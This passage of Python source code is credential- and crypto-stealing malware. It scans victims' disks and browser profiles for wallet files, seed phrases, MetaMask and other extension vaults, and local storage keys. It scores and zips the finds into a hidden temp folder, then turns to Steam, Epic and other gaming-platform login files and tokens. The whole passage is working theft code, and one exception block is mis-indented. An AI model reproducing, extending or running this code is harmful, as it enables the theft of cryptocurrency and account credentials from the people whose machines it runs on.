                "size_estimate": sum(w.get("size_estimate", 1024) for w in browser_wallets.values()),
                "extraction_method": "browser_extension_scan"
            }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["CRITICAL"])
        
        extraction_time = time.time() - extraction_start
        
        logger.info(f"✅ CRYPTO EXTRACTION COMPLETE:")
        logger.info(f"   💎 Wallets found: {self.extraction_stats['wallets_found']}")
        logger.info(f"   📁 Critical files: {self.extraction_stats['critical_files']}")
        logger.info(f"   💾 Total size: {self.extraction_stats['total_size']:,} bytes")
        logger.info(f"   ⏱️ Extraction time: {extraction_time:.2f}s")
        
        return self.wallet_data
    
    def _extract_wallet_data_enhanced(self, wallet_name, paths):
        """Enhanced wallet data extraction with deep scanning"""
        wallet_info = {
            "wallet_type": wallet_name,
            "extraction_method": "enhanced_deep_scan",
            "files": [],
            "directories": [],
            "backups_created": [],
            "total_size": 0,
            "critical_score": 0,
            "extraction_time": datetime.now().isoformat(),
            "metadata": {}
        }
        
        try:
            found_paths = []
            
            for path_pattern in paths:
                expanded_path = os.path.expandvars(path_pattern)
                
                if "*" in expanded_path:
                    # Handle wildcards with enhanced matching
                    matching_paths = glob.glob(expanded_path, recursive=True)
                    found_paths.extend([p for p in matching_paths if os.path.exists(p)])
                else:
                    if os.path.exists(expanded_path):
                        found_paths.append(expanded_path)
            
            # Process all found paths
            for path in found_paths:
                if os.path.isfile(path):
                    file_info = self._analyze_wallet_file_enhanced(path, wallet_name)
                    if file_info:
                        wallet_info["files"].append(file_info)
                        wallet_info["total_size"] += file_info["size"]
                        wallet_info["critical_score"] += file_info.get("critical_score", 1)
                        
                elif os.path.isdir(path):
                    dir_info = self._analyze_wallet_directory_enhanced(path, wallet_name)
                    if dir_info and dir_info["files"]:
                        wallet_info["directories"].append(dir_info)
                        wallet_info["files"].extend(dir_info["files"])
                        wallet_info["total_size"] += dir_info["total_size"]
                        wallet_info["critical_score"] += dir_info.get("critical_score", 1)
            
            # Create secure backups for critical wallets
            if wallet_info["files"] and wallet_info["critical_score"] > 0:
                backup_paths = self._create_comprehensive_wallet_backup(wallet_info, wallet_name)
                wallet_info["backups_created"] = backup_paths
                self.extraction_stats["backup_created"] += len(backup_paths)
            
            # Enhanced metadata extraction
            wallet_info["metadata"] = self._extract_wallet_metadata_enhanced(wallet_name, wallet_info)
            
            return wallet_info if wallet_info["files"] else None
            
        except Exception as e:
            logger.error(f"❌ Enhanced wallet extraction failed for {wallet_name}: {e}")
            wallet_info["error"] = str(e)
            return wallet_info
    
    def _analyze_wallet_file_enhanced(self, file_path, wallet_type):
        """Enhanced analysis of individual wallet files"""
        try:
            stat = os.stat(file_path)
            filename = os.path.basename(file_path)
            
            file_info = {
                "name": filename,
                "path": file_path,
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "is_critical": True,
                "wallet_type": wallet_type,
                "critical_score": 0,
                "file_analysis": {}
            }
            
            # Enhanced critical file detection
            critical_score = self._calculate_file_critical_score(filename, wallet_type, stat.st_size)
            file_info["critical_score"] = critical_score
            
            # File content analysis for small files
            if stat.st_size < 1024 * 1024:  # Analyze files under 1MB
                content_analysis = self._analyze_wallet_file_content(file_path, wallet_type)
                file_info["file_analysis"] = content_analysis
                if content_analysis.get("contains_private_keys", False):
                    file_info["critical_score"] += 10
            
            # Security hash for integrity
            if stat.st_size < 50 * 1024 * 1024:  # Hash files under 50MB
                try:
                    with open(file_path, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()[:16]
                    file_info["security_hash"] = file_hash
                except:
                    pass
            
            return file_info if critical_score > 0 else None
            
        except Exception as e:
            logger.error(f"❌ Error analyzing wallet file {file_path}: {e}")
            return None
    
    def _calculate_file_critical_score(self, filename, wallet_type, file_size):
        """Calculate critical score for wallet files"""
        score = 0
        filename_lower = filename.lower()
        
        # Wallet-specific critical patterns with scores
        critical_patterns = {
            "metamask": {
                "vault": 10, "keystore": 8, "json": 6, "dat": 4
            },
            "exodus": {
                "seed": 10, "wallet": 8, "exodus.conf": 6, "passphrase": 9
            },
            "electrum": {
                "wallet": 8, "seed": 10, "config": 4
            },
            "bitcoin_core": {
                "wallet.dat": 10, "bitcoin.conf": 6, "peers.dat": 3
            },
            "trust_wallet": {
                "keystore": 9, "backup": 8, "json": 6
            },
            "atomic_wallet": {
                "wallet": 8, "seed": 10, "private": 9
            }
        }
        
        patterns = critical_patterns.get(wallet_type, {
            "wallet": 6, "key": 8, "seed": 10, "private": 9, "backup": 7
        })
        
        # Check filename patterns
        for pattern, pattern_score in patterns.items():
            if pattern in filename_lower:
                score += pattern_score
        
        # Universal critical keywords
        universal_critical = {
            "private": 9, "seed": 10, "mnemonic": 10, "backup": 7,
            "recovery": 8, "vault": 9, "keystore": 8, "master": 6
        }
        
        for keyword, keyword_score in universal_critical.items():
            if keyword in filename_lower:
                score += keyword_score
        
        # File size considerations
        if 1000 < file_size < 100000:  # Sweet spot for wallet files
            score += 2
        elif file_size > 1000000:  # Large files might be databases
            score += 1
        
        return score
    
    def _analyze_wallet_file_content(self, file_path, wallet_type):
        """Analyze wallet file content for sensitive data indicators"""
        analysis = {
            "contains_private_keys": False,
            "contains_seed_phrase": False,
            "contains_encrypted_data": False,
            "json_structure": False,
            "detected_format": "unknown"
        }
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read(8192)  # Read first 8KB
            
            # Try to decode as text
            try:
                text_content = content.decode('utf-8', errors='ignore').lower()
                
                # Look for critical patterns
                if any(pattern in text_content for pattern in ['private', 'seed', 'mnemonic', 'xprv', 'xpub']):
                    analysis["contains_private_keys"] = True
                
                if any(pattern in text_content for pattern in ['word', 'phrase', 'mnemonic', 'seed']):
                    analysis["contains_seed_phrase"] = True
                
                # Check for JSON structure
                if text_content.strip().startswith('{') and '"' in text_content:
                    analysis["json_structure"] = True
                    analysis["detected_format"] = "json"
                    
            except:
                pass
            
            # Check for encryption signatures
            if content.startswith(b'Salted__') or b'\x01\x42' in content[:100]:
                analysis["contains_encrypted_data"] = True
                analysis["detected_format"] = "encrypted"
            
            # SQLite database detection
            if content.startswith(b'SQLite format 3'):
                analysis["detected_format"] = "sqlite"
            
        except Exception as e:
            logger.debug(f"Content analysis failed for {file_path}: {e}")
        
        return analysis
    
    def _analyze_wallet_directory_enhanced(self, dir_path, wallet_type):
        """Enhanced analysis of wallet directories"""
        dir_info = {
            "path": dir_path,
            "wallet_type": wallet_type,
            "files": [],
            "subdirectories": [],
            "total_size": 0,
            "critical_score": 0,
            "directory_analysis": {
                "file_count": 0,
                "critical_files": 0,
                "has_config": False,
                "has_data": False
            }
        }
        
        try:
            for root, dirs, files in os.walk(dir_path):
                # Limit depth to prevent excessive scanning
                level = root.replace(dir_path, '').count(os.sep)
                if level >= 3:
                    dirs[:] = []  # Don't go deeper
                    continue
                
                for filename in files:
                    file_path = os.path.join(root, filename)
                    
                    try:
                        file_info = self._analyze_wallet_file_enhanced(file_path, wallet_type)
                        if file_info:
                            dir_info["files"].append(file_info)
                            dir_info["total_size"] += file_info["size"]
                            dir_info["critical_score"] += file_info["critical_score"]
                            
                            if file_info["critical_score"] > 5:
                                dir_info["directory_analysis"]["critical_files"] += 1
                                
                    except Exception as e:
                        logger.debug(f"Error analyzing file {file_path}: {e}")
                        continue
                
                dir_info["directory_analysis"]["file_count"] = len(files)
                
                # Check for important subdirectories
                for dirname in dirs:
                    if any(keyword in dirname.lower() for keyword in ['wallet', 'backup', 'key', 'data']):
                        dir_info["subdirectories"].append(dirname)
            
         except Exception as e:
         logger.error(f"Error: {e}")
        
        return dir_info if dir_info["files"] else None
        
    def _create_comprehensive_wallet_backup(self, wallet_info, wallet_name):
        """Create comprehensive backup of wallet data"""
        backup_paths = []
        
        try:
            backup_dir = os.path.join(tempfile.gettempdir(), "critical_wallet_backups")
            os.makedirs(backup_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Create individual file backups for high-critical files
            high_critical_files = [f for f in wallet_info["files"] if f.get("critical_score", 0) >= 8]
            
            for file_info in high_critical_files:
                try:
                    source_path = file_info["path"]
                    if os.path.exists(source_path):
                        backup_filename = f"CRITICAL_{wallet_name}_{timestamp}_{file_info['name']}"
                        backup_path = os.path.join(backup_dir, backup_filename)
                        shutil.copy2(source_path, backup_path)
                        backup_paths.append(backup_path)
                        logger.info(f"🔒 Critical file backed up: {backup_filename}")
                except Exception as e:
                    logger.error(f"❌ Failed to backup {file_info['name']}: {e}")
            
            # Create comprehensive ZIP backup
            if wallet_info["files"]:
                zip_filename = f"WALLET_{wallet_name}_COMPLETE_{timestamp}.zip"
                zip_path = os.path.join(backup_dir, zip_filename)
                
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
                    for file_info in wallet_info["files"]:
                        source_path = file_info["path"]
                        if os.path.exists(source_path):
                            arcname = f"{wallet_name}/{file_info['name']}"
                            zipf.write(source_path, arcname)
                
                backup_paths.append(zip_path)
                logger.info(f"📦 Comprehensive wallet backup: {zip_filename}")
            
        except Exception as e:
            logger.error(f"❌ Error creating wallet backup: {e}")
        
        return backup_paths
    
    def _extract_browser_wallet_data_enhanced(self):
        """Enhanced extraction of wallet data from browser extensions"""
        browser_wallets = {}
        
        try:
            for browser_name, paths in CONFIG["BROWSER_PATHS"].items():
                for path_pattern in paths:
                    expanded_path = os.path.expandvars(path_pattern)
                    
                    if "*" in expanded_path:
                        matching_paths = glob.glob(expanded_path)
                    else:
                        matching_paths = [expanded_path] if os.path.exists(expanded_path) else []
                    
                    for browser_path in matching_paths:
                        if os.path.exists(browser_path):
                            wallet_data = self._scan_browser_for_wallets(browser_path, browser_name)
                            if wallet_data:
                                browser_wallets[f"{browser_name}_{os.path.basename(browser_path)}"] = wallet_data
        
        except Exception as e:
            logger.error(f"❌ Error extracting browser wallet data: {e}")
        
        return browser_wallets
    
    def _scan_browser_for_wallets(self, browser_path, browser_name):
        """Scan browser for wallet extensions and data"""
        wallet_data = {
            "browser": browser_name,
            "path": browser_path,
            "wallet_extensions": [],
            "wallet_local_storage": {},
            "size_estimate": 0,
            "critical_extensions_found": 0
        }
        
        try:
            # Scan for wallet extensions
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
            
            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                if not os.path.exists(profile_path):
                    continue
                
                # Check extensions
                extensions_path = os.path.join(profile_path, "Extensions")
                if os.path.exists(extensions_path):
                    extensions = self._scan_wallet_extensions_enhanced(extensions_path)
                    wallet_data["wallet_extensions"].extend(extensions)
                    wallet_data["critical_extensions_found"] += len(extensions)
                
                # Check local storage for wallet data
                local_storage_path = os.path.join(profile_path, "Local Storage")
                if os.path.exists(local_storage_path):
                    wallet_storage = self._scan_wallet_local_storage(local_storage_path)
                    if wallet_storage:
                        wallet_data["wallet_local_storage"][profile] = wallet_storage
                        wallet_data["size_estimate"] += 10 * 1024  # Estimate 10KB per profile
        
        except Exception as e:
            logger.error(f"❌ Error scanning browser {browser_name}: {e}")
        
        return wallet_data if wallet_data["critical_extensions_found"] > 0 or wallet_data["wallet_local_storage"] else None
    
    def _scan_wallet_extensions_enhanced(self, extensions_path):
        """Enhanced scanning for wallet extensions"""
        wallet_extensions = []
        
        # Known wallet extension IDs and patterns
        known_wallet_extensions = {
            "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
            "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
            "bhhhlbepdkbapadjdnnojkbgioiodbic": "Solflare",
            "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Wallet",
            "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
            "jnlgamecbpmbajjfhmmmlhejkemejdma": "Brave Wallet",
            "nanjmdknhkinifnkgdcggcfnhdaammmj": "Keplr",
            "fijngjgcjhjmmpcmkeiomlglpeiijkld": "Yoroi",
            "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr Beta",
            "cgeeodpfagjceefieflmdfphplkenlfk": "XDEFI Wallet"
        }
        
        wallet_name_patterns = [
            "metamask", "phantom", "solflare", "binance", "coinbase", "wallet", 
            "crypto", "bitcoin", "ethereum", "solana", "cardano", "polkadot",
            "keplr", "yoroi", "nami", "eternl", "flint", "gero", "typhon"
        ]
        
        try:
            for ext_id in os.listdir(extensions_path):
                if ext_id in known_wallet_extensions:
                    # Known wallet extension found
                    ext_path = os.path.join(extensions_path, ext_id)
                    wallet_ext_info = self._analyze_wallet_extension(ext_path, ext_id, known_wallet_extensions[ext_id])
                    if wallet_ext_info:
                        wallet_extensions.append(wallet_ext_info)
                        logger.info(f"💎 Found known wallet: {known_wallet_extensions[ext_id]}")
                else:
                    # Check unknown extensions for wallet patterns
                    ext_path = os.path.join(extensions_path, ext_id)
                    if os.path.exists(ext_path):
                        wallet_ext_info = self._analyze_unknown_extension_for_wallet(ext_path, ext_id, wallet_name_patterns)
                        if wallet_ext_info:
                            wallet_extensions.append(wallet_ext_info)
                            logger.info(f"💎 Found potential wallet: {wallet_ext_info.get('name', ext_id)}")
        
        except Exception as e:
            logger.error(f"❌ Error scanning wallet extensions: {e}")
        
        return wallet_extensions
    
    def _analyze_wallet_extension(self, ext_path, ext_id, wallet_name):
        """Analyze known wallet extension"""
        ext_info = {
            "id": ext_id,
            "name": wallet_name,
            "path": ext_path,
            "is_known_wallet": True,
            "version": "unknown",
            "data_files": [],
            "storage_size": 0
        }
        
        try:
            # Find version directories
            version_dirs = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))]
            if version_dirs:
                latest_version = sorted(version_dirs, reverse=True)[0]
                version_path = os.path.join(ext_path, latest_version)
                ext_info["version"] = latest_version
                
                # Check manifest
                manifest_path = os.path.join(version_path, "manifest.json")
                if os.path.exists(manifest_path):
                    with open(manifest_path, 'r', encoding='utf-8') as f:
                        manifest = json.load(f)
                        ext_info["manifest"] = {
                            "name": manifest.get("name", wallet_name),
                            "version": manifest.get("version", "unknown"),
                            "description": manifest.get("description", "")
                        }
                
                # Scan for wallet data files
                for root, dirs, files in os.walk(version_path):
                    for filename in files:
                        if self._is_wallet_data_file(filename):
                            file_path = os.path.join(root, filename)
                            file_size = os.path.getsize(file_path)
                            ext_info["data_files"].append({
                                "name": filename,
                                "path": file_path,
                                "size": file_size,
                                "relative_path": os.path.relpath(file_path, version_path)
                            })
                            ext_info["storage_size"] += file_size
        
        except Exception as e:
            logger.error(f"❌ Error analyzing wallet extension {ext_id}: {e}")
            ext_info["error"] = str(e)
        
        return ext_info
    
    def _analyze_unknown_extension_for_wallet(self, ext_path, ext_id, wallet_patterns):
        """Analyze unknown extension to detect if it's a wallet"""
        try:
            version_dirs = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))]
            if not version_dirs:
                return None
            
            latest_version = sorted(version_dirs, reverse=True)[0]
            manifest_path = os.path.join(ext_path, latest_version, "manifest.json")
            
            if os.path.exists(manifest_path):
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    manifest = json.load(f)
                    
                ext_name = manifest.get("name", "").lower()
                ext_desc = manifest.get("description", "").lower()
                
                # Check if it matches wallet patterns
                if any(pattern in ext_name or pattern in ext_desc for pattern in wallet_patterns):
                    return {
                        "id": ext_id,
                        "name": manifest.get("name", "Unknown Wallet"),
                        "path": ext_path,
                        "is_known_wallet": False,
                        "version": manifest.get("version", "unknown"),
                        "detected_wallet_type": "unknown",
                        "confidence": self._calculate_wallet_confidence(ext_name, ext_desc)
                    }
        
        except Exception as e:
            logger.debug(f"Error analyzing unknown extension {ext_id}: {e}")
        
        return None
    
    def _calculate_wallet_confidence(self, name, description):
        """Calculate confidence that extension is a wallet"""
        confidence = 0
        
        high_confidence_words = ["wallet", "crypto", "metamask", "bitcoin", "ethereum"]
        medium_confidence_words = ["blockchain", "defi", "token", "coin", "finance"]
        
        text = f"{name} {description}".lower()
        
        for word in high_confidence_words:
            if word in text:
                confidence += 3
        
        for word in medium_confidence_words:
            if word in text:
                confidence += 1
        
        return min(confidence, 10)  # Cap at 10
    
    def _is_wallet_data_file(self, filename):
        """Check if file contains wallet data"""
        filename_lower = filename.lower()
        wallet_file_patterns = [
            "vault", "keystore", "storage", "data", "wallet", "account",
            "private", "seed", "mnemonic", "backup", "recovery"
        ]
        return any(pattern in filename_lower for pattern in wallet_file_patterns)
    
    def _scan_wallet_local_storage(self, local_storage_path):
        """Scan browser local storage for wallet data"""
        wallet_storage = {}
        
        try:
            for item in os.listdir(local_storage_path):
                if item.endswith('.localstorage'):
                    domain = item.replace('.localstorage', '')
                    
                    # Check for wallet-related domains
                    wallet_domains = [
                        'metamask', 'phantom', 'solflare', 'binance', 'coinbase',
                        'crypto.com', 'ethereum.org', 'bitcoin.org', 'wallet'
                    ]
                    
                    if any(wd in domain.lower() for wd in wallet_domains):
                        db_path = os.path.join(local_storage_path, item)
                        storage_data = self._extract_wallet_storage_data(db_path)
                        if storage_data:
                            wallet_storage[domain] = storage_data
        
        except Exception as e:
            logger.error(f"❌ Error scanning wallet local storage: {e}")
        
        return wallet_storage
    
    def _extract_wallet_storage_data(self, db_path):
        """Extract wallet data from local storage database"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT key, value FROM ItemTable")
            
            storage_data = {}
            critical_keys = ['vault', 'keyring', 'wallet', 'account', 'private', 'seed']
            
            for row in cursor.fetchall():
                key, value = row[0], row[1]
                if any(ck in key.lower() for ck in critical_keys):
                    storage_data[key] = value[:500] if len(str(value)) > 500 else value  # Truncate long values
            
            conn.close()
            return storage_data if storage_data else None
            
        except Exception as e:
            logger.debug(f"Error extracting wallet storage data: {e}")
            return None
    
    def _extract_wallet_metadata_enhanced(self, wallet_name, wallet_info):
        """Extract enhanced metadata for wallet"""
        metadata = {
            "detection_confidence": "high" if wallet_info["critical_score"] > 10 else "medium",
            "risk_level": self._assess_wallet_risk_level(wallet_info),
            "recommended_action": "immediate_backup" if wallet_info["critical_score"] > 15 else "standard_backup",
            "wallet_analysis": {
                "likely_active": any(f.get("critical_score", 0) > 8 for f in wallet_info["files"]),
                "has_recent_activity": self._check_recent_wallet_activity(wallet_info),
                "estimated_value_indicator": self._estimate_wallet_value_indicator(wallet_info)
            }
        }
        
        return metadata
    
    def _assess_wallet_risk_level(self, wallet_info):
        """Assess risk level of wallet data"""
        if wallet_info["critical_score"] > 20:
            return "critical"
        elif wallet_info["critical_score"] > 10:
            return "high"
        elif wallet_info["critical_score"] > 5:
            return "medium"
        else:
            return "low"
    
    def _check_recent_wallet_activity(self, wallet_info):
        """Check for recent wallet activity"""
        try:
            recent_threshold = datetime.now().timestamp() - (30 * 24 * 3600)  # 30 days ago
            
            for file_info in wallet_info["files"]:
                modified_time = datetime.fromisoformat(file_info["modified"]).timestamp()
                if modified_time > recent_threshold:
                    return True
            return False
        except:
            return False
    
    def _estimate_wallet_value_indicator(self, wallet_info):
        """Estimate wallet value indicator based on file patterns"""
        indicators = {
            "transaction_history": False,
            "multiple_accounts": False,
            "large_storage": False,
            "frequent_updates": False
        }
        
        # Check for transaction history files
        tx_patterns = ["transaction", "history", "log", "activity"]
        indicators["transaction_history"] = any(
            any(pattern in f["name"].lower() for pattern in tx_patterns)
            for f in wallet_info["files"]
        )
        
        # Check for multiple accounts
        indicators["multiple_accounts"] = len(wallet_info["files"]) > 5
        
        # Check for large storage
        indicators["large_storage"] = wallet_info["total_size"] > 1024 * 1024  # > 1MB
        
        # Check for frequent updates
        recent_files = sum(1 for f in wallet_info["files"] 
                          if self._is_file_recently_modified(f, days=7))
        indicators["frequent_updates"] = recent_files > 2
        
        return indicators
    
    def _is_file_recently_modified(self, file_info, days=7):
        """Check if file was modified recently"""
        try:
            modified_time = datetime.fromisoformat(file_info["modified"]).timestamp()
            threshold = datetime.now().timestamp() - (days * 24 * 3600)
            return modified_time > threshold
        except:
            return False

class SuperiorGamingPlatformExtractor:
    """🎮 Superior gaming platform credentials extraction with enhanced detection"""
    
    def __init__(self, priority_queue):
        self.priority_queue = priority_queue
        self.gaming_data = {}
        self.extraction_stats = {
            "platforms_found": 0,
            "credentials_extracted": 0,
            "config_files": 0,
            "total_size": 0
        }
    
    def extract_all_gaming_data(self):
        """Extract all gaming platform data with HIGH priority"""
        logger.info("🎮 Starting SUPERIOR gaming platform extraction...")
        
        extraction_start = time.time()
        
        for platform_name, paths in CONFIG["GAMING_PLATFORMS"].items():
            logger.info(f"🎯 Deep scanning {platform_name} platform...")
            platform_data = self._extract_platform_data_enhanced(platform_name, paths)
            
            if platform_data and platform_data.get("files"):
                self.gaming_data[platform_name] = platform_data
                self.extraction_stats["platforms_found"] += 1
                self.extraction_stats["config_files"] += len(platform_data["files"])
                self.extraction_stats["total_size"] += platform_data.get("total_size", 0)
                self.extraction_stats["credentials_extracted"] += len(platform_data.get("credentials", []))
                
                # Add to HIGH priority queue
                self.priority_queue.add_item({
                    "type": "gaming_platform",
                    "platform": platform_name,
                    "data": platform_data,
                    "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"],
                    "size_estimate": platform_data.get("total_size", 0),
                    "credentials_count": len(platform_data.get("credentials", [])),
                    "extraction_method": "superior_detection"
                }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"])
                
                logger.info(f"🎮 {platform_name}: {len(platform_data['files'])} files, {len(platform_data.get('credentials', []))} credentials")
        
        extraction_time = time.time() - extraction_start
        
        logger.info(f"✅ GAMING EXTRACTION COMPLETE:")
        logger.info(f"   🎮 Platforms: {self.extraction_stats['platforms_found']}")
        logger.info(f"   🔑 Credentials: {self.extraction_stats['credentials_extracted']}")
        logger.info(f"   📁 Config files: {self.extraction_stats['config_files']}")
        logger.info(f"   💾 Total size: {self.extraction_stats['total_size']:,} bytes")
        logger.info(f"   ⏱️ Time: {extraction_time:.2f}s")
        
        return self.gaming_data
    
    def _extract_platform_data_enhanced(self, platform_name, paths):
        """Enhanced extraction from gaming platform with deep analysis"""
        platform_info = {
            "platform": platform_name,
            "extraction_method": "superior_deep_scan",
            "files": [],
            "configs": [],
            "credentials": [],
            "user_accounts": [],
            "game_libraries": [],
            "total_size": 0,
            "critical_score": 0,
            "extraction_time": datetime.now().isoformat()
        }
        
        try:
            found_paths = []
            
            for path_pattern in paths:
                expanded_path = os.path.expandvars(path_pattern)
                
                if "*" in expanded_path:
                    matching_paths = glob.glob(expanded_path, recursive=True)
                    found_paths.extend([p for p in matching_paths if os.path.exists(p)])
                else:
                    if os.path.exists(expanded_path):
                        found_paths.append(expanded_path)
            
            # Enhanced extraction from each found path
            for path in found_paths:
                if os.path.isfile(path):
                    file_analysis = self._analyze_gaming_file_enhanced(path, platform_name)
                    if file_analysis:
                        platform_info["files"].append(file_analysis)
                        platform_info["total_size"] += file_analysis["size"]
                        platform_info["critical_score"] += file_analysis.get("critical_score", 1)
                        
                        # Extract credentials from file
                        creds = self._extract_gaming_credentials_enhanced(path, platform_name)
                        platform_info["credentials"].extend(creds)
                        
                elif os.path.isdir(path):
                    dir_analysis = self._analyze_gaming_directory_enhanced(path, platform_name)
                    if dir_analysis:
                        platform_info["files"].extend(dir_analysis["files"])
                        platform_info["configs"].extend(dir_analysis["configs"])
                        platform_info["credentials"].extend(dir_analysis["credentials"])
                        platform_info["user_accounts"].extend(dir_analysis["user_accounts"])
                        platform_info["total_size"] += dir_analysis["total_size"]
                        platform_info["critical_score"] += dir_analysis["critical_score"]
            
            # Platform-specific enhancements
            if platform_name == "steam":
                steam_extras = self._extract_steam_specific_data(found_paths)
                if steam_extras:
                    platform_info.update(steam_extras)
            elif platform_name == "epic_games":
                epic_extras = self._extract_epic_specific_data(found_paths)
                if epic_extras:
                    platform_info.update(epic_extras)
            
            return platform_info if platform_info["files"] or platform_info["credentials"] else None
            
        except Exception as e:
            logger.error(f"❌ Enhanced platform extraction failed for {platform_name}: {e}")
            platform_info["error"] = str(e)
            return platform_info
    
    def _analyze_gaming_file_enhanced(self, file_path, platform_name):
        """Enhanced analysis of gaming configuration files"""
        try:
            stat = os.stat(file_path)
            filename = os.path.basename(file_path)
            
            file_info = {
                "name": filename,
                "path": file_path,
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "platform": platform_name,
                "is_gaming_config": True,
                "critical_score": 0,
                "file_type": self._detect_gaming_file_type(filename, platform_name),
                "contains_credentials": False
            }
            
            # Calculate critical score
            critical_score = self._calculate_gaming_file_score(filename, platform_name, stat.st_size)
            file_info["critical_score"] = critical_score
            
            # Quick content analysis for small files
            if stat.st_size < 1024 * 1024:  # Files under 1MB
                content_analysis = self._analyze_gaming_file_content(file_path, platform_name)
                file_info["content_analysis"] = content_analysis
                file_info["contains_credentials"] = content_analysis.get("has_credentials", False)
                
                if content_analysis.get("has_credentials", False):
                    file_info["critical_score"] += 5
            
            return file_info if critical_score > 0 else None
            
        except Exception as e:
            logger.error(f"❌ Error analyzing gaming file {file_path}: {e}")
            return None
    
    def _detect_gaming_file_type(self, filename, platform):
        """Detect type of gaming configuration file"""
        filename_lower = filename.lower()
        
        type_patterns = {
            "config": ["config", "settings", "preferences"],
            "user_data": ["user", "account", "profile", "login"],
            "game_data": ["save", "progress", "achievement", "stats"],
            "cache": ["cache", "temp", "log"],
            "library": ["library", "manifest", "installed"]
        }
        
        for file_type, patterns in type_patterns.items():
            if any(pattern in filename_lower for pattern in patterns):
                return file_type
        
        # Platform-specific detection
        platform_specific = {
            "steam": {
                ".vdf": "valve_data_format",
                ".acf": "application_cache_format",
                "ssfn": "steam_security_file"
            },
            "epic_games": {
                ".json": "epic_config",
                ".dat": "epic_data",
                ".ini": "epic_settings"
            }
        }
        
        if platform in platform_specific:
            for ext, file_type in platform_specific[platform].items():
                if ext in filename_lower:
                    return file_type
        
        return "unknown"
    
    def _calculate_gaming_file_score(self, filename, platform, file_size):
        """Calculate critical score for gaming files"""
        score = 0
        filename_lower = filename.lower()
        
        # Platform-specific critical files
        platform_critical_files = {
            "steam": {
                "loginusers.vdf": 10, "config.vdf": 8, "registry.vdf": 6,
                "ssfn": 9, "steamapps": 4
            },
            "epic_games": {
                "launcher.dat": 8, "settings.json": 6, "installinfo.json": 4,
                "user.json": 7
            },
            "origin": {
                "local.xml": 8, "settings.ini": 6, "originuserdata.xml": 7
            },
            "battle_net": {
                "battle.net.config": 8, "client.config": 6, ".db": 5
            }
        }
        
        critical_files = platform_critical_files.get(platform, {})
        
        # Check exact matches first
        for pattern, pattern_score in critical_files.items():
            if pattern in filename_lower:
                score += pattern_score
        
        # Universal gaming critical patterns
        universal_patterns = {
            "login": 8, "user": 6, "account": 7, "auth": 9, "token": 9,
            "session": 7, "credential": 8, "password": 9, "save": 4
        }
        
        for pattern, pattern_score in universal_patterns.items():
            if pattern in filename_lower:
                score += pattern_score
        
        # File size considerations
        if 1000 < file_size < 1000000:  # 1KB to 1MB - typical config size
            score += 2
        elif file_size > 10000000:  # Very large files might contain game data
            score += 1
        
        return score
    
    def _analyze_gaming_file_content(self, file_path, platform):
        """Analyze gaming file content for credentials and sensitive data"""
        analysis = {
            "has_credentials": False,
            "has_user_data": False,
            "has_session_data": False,
            "detected_format": "unknown",
            "credential_indicators": []
        }
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read(8192)  # Read first 8KB
            
            # Try text analysis
            try:
                text_content = content.decode('utf-8', errors='ignore').lower()
                
                # Look for credential patterns
                credential_patterns = [
                    'username', 'password', 'token', 'auth', 'session',
                    'login', 'account', 'user_id', 'api_key'
                ]
                
                found_patterns = [pattern for pattern in credential_patterns if pattern in text_content]
                analysis["credential_indicators"] = found_patterns
                analysis["has_credentials"] = len(found_patterns) > 0
                
                # Detect format
                if text_content.strip().startswith('{'):
                    analysis["detected_format"] = "json"
                elif '"' in text_content and '{' in text_content:
                    analysis["detected_format"] = "vdf"  # Valve Data Format
                elif '=' in text_content and '[' in text_content:
                    analysis["detected_format"] = "ini"
                
            except:
                pass
            
            # Binary analysis
            if content.startswith(b'STMF') or content.startswith(b'VDF'):
                analysis["detected_format"] = "valve_binary"
            elif content.startswith(b'PK'):
                analysis["detected_format"] = "zip_archive"
            
        except Exception as e:
            logger.debug(f"Gaming file content analysis failed for {file_path}: {e}")
        
        return analysis
    
    def _analyze_gaming_directory_enhanced(self, dir_path, platform_name):
        """Enhanced analysis of gaming platform directories"""
        dir_info = {
            "path": dir_path,
            "platform": platform_name,
            "files": [],
            "configs": [],
            "credentials": [],
            "user_accounts": [],
            "total_size": 0,
            "critical_score": 0,
            "directory_analysis": {
                "file_count": 0,
                "config_files": 0,
                "credential_files": 0,
                "user_data_files": 0
            }
        }
        
        try:
            for root, dirs, files in os.walk(dir_path):
                # Limit scanning depth
                level = root.replace(dir_path, '').count(os.sep)
                if level >= 4:
                    dirs[:] = []
                    continue
                
                for filename in files:
                    file_path = os.path.join(root, filename)
                    
                    try:
                        if self._is_gaming_file_relevant(filename, platform_name):
                            file_analysis = self._analyze_gaming_file_enhanced(file_path, platform_name)
                            if file_analysis:
                                dir_info["files"].append(file_analysis)
                                dir_info["total_size"] += file_analysis["size"]
                                dir_info["critical_score"] += file_analysis["critical_score"]
                                
                                # Categorize file
                                if file_analysis.get("contains_credentials", False):
                                    dir_info["directory_analysis"]["credential_files"] += 1
                                
                                if file_analysis.get("file_type") == "config":
                                    dir_info["directory_analysis"]["config_files"] += 1
                                
                                # Extract credentials
                                creds = self._extract_gaming_credentials_enhanced(file_path, platform_name)
                                dir_info["credentials"].extend(creds)
                                
                    except Exception as e:
